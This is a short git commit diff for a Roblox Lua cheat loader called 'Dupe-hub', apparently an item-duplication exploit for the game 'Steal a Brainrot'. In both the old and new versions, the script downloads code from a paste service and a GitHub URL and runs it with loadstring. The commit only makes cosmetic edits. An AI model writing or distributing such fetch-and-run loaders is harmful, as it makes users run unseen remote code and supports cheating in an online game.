342d0ea4d2f41b9b082b0841531c3a2b88b87a1c
Silentx <silentxvn@gmail.com>
2025-11-08 13:36:11 +0700

    Update Dupe-hub.lua

--- Dupe-hub.lua
+++ Dupe-hub.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/QGrTKeHMbBd4L3I2/raw"))();
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/refs/heads/main/Dupe-hub.lua"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/QGrTKeHMbBd4L3I2/raw"))()
+local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/refs/heads/main/Dupe-hub.lua"))()
